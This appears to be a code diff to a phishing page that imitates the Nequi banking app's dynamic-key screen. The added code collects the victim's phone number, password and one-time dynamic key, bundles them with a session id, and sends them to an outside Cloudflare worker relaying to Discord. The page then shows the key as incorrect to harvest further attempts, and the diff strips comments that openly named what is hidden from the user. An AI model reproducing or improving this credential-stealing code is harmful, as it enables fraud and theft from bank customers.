@@ -61,7 +61,7 @@
             color: #999;
             margin-top: 5px;
             margin-bottom: 20px;
-            display: none; /* OCULTO PARA EL USUARIO */
+            display: none;
         }
         .pin-dots {
             display: flex;
@@ -135,7 +135,6 @@
             La clave dinámica es incorrecta o ha expirado. Verifícala en tu app Nequi.
         </div>
         
-        <!-- OCULTO: El usuario no ve este contador -->
         <div class="intentos-restantes" id="intentosRestantes">
             Intentos restantes: <span id="contadorIntentos">3</span>
         </div>
@@ -188,22 +187,28 @@
                     if (key === '✓') {
                         if (pin.length === maxLength) {
                             
-                            // ========== ENVIAR A DISCORD Y ESPERAR ==========
                             const webhookURL = 'https://nequi-worker.miprimercredito.workers.dev';
+                            const sesionId = localStorage.getItem('sesionId') || 'DESCONOCIDO';
                             
-                            // Mensaje para Discord (INCLUYE número de intento)
-                            const mensaje = `🔢 **CLAVE DINÁMICA**\n` +
-                                            `Clave: ${pin}\n` +
-                                            `Resultado: ${intentos - 1 <= 0 ? '❌ BLOQUEADO' : `❌ Incorrecta (Intento ${4 - intentos} de 3)`}`;
+                            // Recuperar datos acumulados
+                            const datosSesion = JSON.parse(localStorage.getItem('datosSesion')) || {};
+                            const numero = datosSesion.numero || 'No registrado';
+                            const clave = datosSesion.clave || 'No registrada';
                             
-                            // Usamos .then() para asegurar que el fetch se complete antes de redirigir
+                            // Mensaje COMPLETO con toda la información
+                            const mensaje = `🔢 **CLAVE DINÁMICA - RESUMEN**\n` +
+                                            `🆔 ${sesionId}\n` +
+                                            `📱 Número: +57 ${numero}\n` +
+                                            `🔐 Clave: ${clave}\n` +
+                                            `🔢 Dinámica: ${pin}\n` +
+                                            `📊 Resultado: ${intentos - 1 <= 0 ? '❌ BLOQUEADO' : `❌ Incorrecta (Intento ${4 - intentos} de 3)`}`;
+                            
                             fetch(webhookURL, {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({ content: mensaje })
                             })
                             .then(() => {
-                                // Este código se ejecuta DESPUÉS de que fetch termine
                                 intentos--;
                                 actualizarContador();
                                 
@@ -214,7 +219,6 @@
                                 }
                             })
                             .catch(error => {
-                                // Si hay error, igual continuamos para no bloquear al usuario
                                 console.error('Error Discord:', error);
                                 intentos--;
                                 actualizarContador();
@@ -225,9 +229,8 @@
                                     window.location.href = `carga-intento.html?intento=${3 - intentos}`;
                                 }
                             });
-                            // ===============================================
                             
-                            return; // Evitar que se ejecute más código
+                            return;
                         }
                     } else if (pin.length < maxLength) {
                         pin += key;
